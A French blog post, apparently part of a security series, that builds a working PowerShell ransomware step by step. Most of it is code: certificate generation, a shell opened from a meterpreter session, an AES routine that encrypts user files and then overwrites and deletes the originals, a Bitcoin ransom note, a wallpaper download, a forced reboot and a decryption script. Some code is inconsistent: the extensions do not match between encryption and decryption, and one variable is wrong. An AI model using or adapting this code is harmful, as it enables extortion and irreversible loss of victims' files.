+++
date = "2020-03-23T10:32:00+00:00"
draft = false
tags = ['securité']
title = "Ransomware"
author = "Claw"
+++

## Ransomware {#ransomware}

Un rançongiciel de l'anglais ransomware, logiciel de rançon ou logiciel d'extorsion, est un logiciel malveillant qui prend en otage des données personnelles.

- chiffrement symétrique des fichiers avec une clef aleatoire
- chiffrement asymétrique de la clef avec un certificat public
- seul le détenteur du certificat privé dechiffrera la clef
- tout faire en mémoire pour ne laisser aucune trace sur le disque

Un ransomware peut aussi bloquer l'accès de tout utilisateur à une machine
jusqu'à ce qu'une clé ou un outil de débridage soit envoyé à la victime en
échange d'une somme d'argent. Les modèles modernes de rançongiciels sont
apparus en Russie initialement, mais on constate que le nombre d'attaques de ce
type a grandement augmenté dans d'autres pays, entre autres l'Australie,
l'Allemagne, les États-Unis.

- On va chiffrer le fichier avec du chiffrement symmetrique et utiliser de l'encryption asymmetrique pour encrypter la clée de cryptage...
- Seul ceui qui a le certificat privé poura decrypter la clé utilisée..
- Une encryption assymetrique pour tt encrypter prendrai trop de temps..

### Certificat

Note:
Un certificat électronique (aussi appelé certificat numérique ou certificat de clé publique) peut être vu comme une carte d'identité numérique. Il est utilisé principalement pour identifier et authentifier une personne physique ou morale, mais aussi pour chiffrer des échanges1.

Il s’agit également d’un concept très important pour tous ceux qui sont de véritables autorités en termes de sécurité informatique2.

Le standard le plus utilisé pour la création des certificats numériques est le X.509.


#### Generation

```powershell
$cert = New-SelfSignedCertificate `
        -DnsName $YOUR_NAME `
        -CertStoreLocation "Cert:\CurrentUser\My" `
        -KeyLength 3072 `
        -HashAlgorithm "Sha384" `
        -NotBefore ((Get-Date).AddDays(-1)) `
        -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) `
        -Type DocumentEncryptionCert `
        -KeyUsage KeyEncipherment, DataEncipherment
```


#### Export

```powershell
> Export-Certificate -Cert $cert -FilePath "cert.cer" | Out-Null
```


#### Texte

base64 permet de chiffrer le certificat en texte afin de pouvoir le copier plus facilement qu'en binaire

```
[Convert]::ToBase64String(
    [IO.File]::ReadAllBytes("/users/...../cert.cer")
)
```

#### Mot de passe

```psh
meterpreter > shell
> powershell
> Add-Type -AssemblyName System.web
> $pwd = [system.web.security.membership]::GeneratePassword(32,15)
> $cert = "MIIECDCCAnCgAwIBAgIQFTufS/aikLxCOTgoWoLnyDANBgkqhkiG9w0BAQwFADARMQ8wDQYDVQQDDAZteWNlcnQwIBcNMTkxMTI5MTUyODQ3WhgPMjA5OTEyMzExNTI4NDhaMBExDzANBgNVBAMMBm15Y2VydDCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAM/tJpom3ha8jKgtYzqoC2vIeJ/7xAHJ/B/q+FPS3ByhfsggnazOgMw+F6DIEnXG95wumlcF6e/M9gH2irUqwBIA0x2eDrGlH2k71ifE/iMe7TQBwe2uTDD0Vp3c6sFK6CMQOW3Ws30k2j+6E4KaUvdd52T5aYkYGCPj4MEe1noLy8t+GMDIT5bXw0TZluAGY6ExUVR8rN7AtsjBTcp9LWWw/5hlSZwDbMffYDdRlgm82QJedAYewyk6PwkjzcqsOdFV4Z8EmlIP2EM4Tnn6pHugJ3W5IIiRvNMVoPWiePBiThfR/npFnynqIDxJr973vdOjtCHBujTnU28nQfPqMb8E0lqlSeXskjZV176nuXB/1blvkNm0IYnJ/pm6i4p9mBjS0RoKlbPUg8iFcmtjjytQdjXDDtDpixyGcW/QfXyJFcfjl16A27QN3dNXEKYdhKhPSXM8zRedecpcvHl4t3iawW0EZlsFqzKlyjtr7zi5uj9nGHQajPBqNHrCXl6aJQIDAQABo1owWDAOBgNVHQ8BAf8EBAMCBDAwFAYDVR0lBA0wCwYJKwYBBAGCN1ABMBEGA1UdEQQKMAiCBm15Y2VydDAdBgNVHQ4EFgQUrwXEYlg0/q3ImayX6udhRvOTyt0wDQYJKoZIhvcNAQEMBQADggGBAHyM16X0efwFC2DwbbFT0RoFU9MLfEv1OrkaHFNPjn37p/53638o78dkBt28Hoi9LuGbN20dN7N0yu4W/cyFnuGjoz5zv2M9Tbipp+gO91jruxZmrXz6NSV/5jhAehZyP1MvVg1Nyub6n3WXkhekFQCmq0LORqBfgscwV2MNV1or2ThWCKRygrm3TgvuxPi5Wt40KrYTrp6VmVq39rXnfWJZD5oiCeIEI2OVf5BfFt1sgC4f2CQ2Ig/mjFrzzTtJWu5tNmJNknE8FIQN48LVsO7EFONXcx3VQ/WNO7Efo17BUCYl+CPNcYDMLWP/oKA/Hdbv4OTLcBbpiO0nNB1USn1YPASypVcXGC9y9Z6APBtrN4oVFY3yiuScXFjIm/fCWZN5IYpwIv3WuRG+p+X2ZE9Gw2GgeQCdpBXaS/YDix0oFHI3sRtmmUs0oKjbQEsEOgyOYnd65k5PK2Fcb/Rph0X+G97ErvOqlvhvfnvX0AosdCHnneYoBy0IcZYji2reAA=="
> $cert =  [IO.File]::WriteAllBytes("/windows/temp/x.cer", [Convert]::FromBase64String($cert))
> echo (Protect-CmsMessage -Content $pwd -To "/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
```

- [1-2] Lancer powershell depuis notre session meterpreter
- [3-4] Creer un mot de passe random
- [5] Notre certificat public en base64
- [6] Décodage du certificat dans un fichier
- [7] Sauvegarde du mot de passe chiffré avec le certificat public


#### Chiffrement de fichier


Fonction de chiffrement d'un fichier:

```powershell
Function Encr{param([string]$i,[string]$p)
  process{
    [System.Security.Cryptography.AesCryptoServiceProvider]$a=[System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $a.BlockSize=128
    $a.KeySize=256
    $a.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $a.GenerateIV();[byte[]]$IV=$a.IV;[byte[]]$k=[system.Text.Encoding]::UTF8.GetBytes($pwd)
    [System.IO.FileStream]$fout=[System.IO.FileStream]::new($i+".MAD_666",[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$IC=$a.CreateEncryptor($k,$IV)
    [System.Security.Cryptography.CryptoStream]$CS=[System.Security.Cryptography.CryptoStream]::new($fout, $IC, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [System.IO.FileStream]$fin=[System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    $fout.Write($IV,0,$IV.Count)
    $DA=$true;[int]$D
    While ($DA){
      $D=$fin.ReadByte()
      if($D -ne -1){
        $CS.WriteByte([byte]$D)
      }
      else{
        $DA = $false
      }
    }
    $fin.Dispose();
    $CS.Dispose();
    $fout.Dispose()
  }
}
```
Boucle pour encrypter tout les fichiers:

```powershell
foreach ($i in
    $(Get-ChildItem /users/$env:USERNAME -recurse -include *.txt,*.jpg,*mp3 | ForEach-Object { $_.FullName })
  ){
  Encr -i $i -p $pwd
  $size = [math]::round(((Get-Item $i)).length/4)+1
  $str = "hack" * $size
  echo $str > $i
  rm $i
}
```

Effacer la variable de mot de passe:

```powershell
> remove-variable pwd
```

Instructions pour la victime:

```psh
> $email = 'mon@email'
> $btc = ''
> echo "Send 0.1 btc to this account: $btc
After that, for the decryption keys and instructions for how to retrieve your files
send the content of the encrypted_keys and a proof of payment to this email:
$email" > /users/$env:USERNAME/desktop/README.txt
```

- [1] Email de l'attaquant pour envoyer la clef chiffrée
- [2] Addresse BitCoin pour recevoir le paiement
- [3] Message sur le bureau


#### Fond d'écran facultatif

```psh
> $img = 'http://xxx.xxx.Xxx/xxx.jpg'
> Invoke-WebRequest -Uri $img -OutFile "/users/$env:USERNAME/img.jpg"
> Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value "/users/$env:USERNAME/img.jpg"
> rundll32.exe user32.dll, UpdatePerUserSystemParameters
```

- [1] Définir l'URL de l'image du fond d'écran
- [2] Télecharger l'image
- [3] Définir le chemin de l'image à utiliser en fond d'écran
- [4] Appliquer le nouveau fond d'écran


Redémarrer:

```psh
> restart-computer -force
```


### Déchiffrement du mot de passe

La victime va envoyer la clée encrypter avec le certificat public, pour la decrypter.
Sur la machine de l'attaquant, avec le certificat privé

```psh
> Unprotect-CmsMessage -path .../encrypted_key.txt
```

### Libération

```psh
$pwd = '' # Le password decrypté

function Decr{
  param([string]$i,[string]$p)
  process {
    $out = $i -replace ".{7}$"
    [System.IO.FStream]$FileStreamIn = [System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    [byte[]]$IV = New-Object byte[] 16; $FileStreamIn.Read($IV, 0, $IV.Length)
    [System.Security.Cryptography.AesCryptoServiceProvider]$Aes =  [System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $Aes.BlockSize = 128; $Aes.KeySize = 256; $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    [byte[]]$Key = [system.Text.Encoding]::UTF8.GetBytes($Password)
    [System.IO.FileStream]$FileStreamOut = [System.IO.FileStream]::new($out,[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$ICryptoTransform = $Aes.CreateDecryptor($Key,$IV)
    [System.Security.Cryptography.CryptoStream]$CryptoStream = [System.Security.Cryptography.CryptoStream]::new($FileStreamIn, $ICryptoTransform, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $DataAvailable = $true; [int]$Data
    While ($DataAvailable){
      $Data = $CryptoStream.ReadByte()
      if($Data -ne -1){
        $FileStreamOut.WriteByte([byte]$Data)
      }
      else{
        $DataAvailable = $false
      }
    }
    $FileStreamIn.Dispose()
    $CryptoStream.Dispose()
    $FileStreamOut.Dispose()
  }
}
```

### Boucle

On envoie par mail a la victime le script qu'il devra copier-coller dans powershell...

```powershell
# On loop et decrypte les fichiers avec l'extention ".LCK_666"
foreach ($i in $(Get-ChildItem /users/$env:USERNAME -recurse -include *.LCK_666 | ForEach-Object { $_.FullName })){
  Decr -i $i -p $pwd
  rm $i
}
```

#### Conclusion

- pas besoin de vulnérabilité logicielle
- si ce n'est l'accès physique
- négligence, lockpicking, social engineering ...
- necessite compétences variées et combinées
<!--  -->

- [Partie 1: RubberDucky](/posts/2020-03-24-rubberducky/)
- [Partie 3: SSL mitm](/posts/2020-03-24-ssl_mitm/)

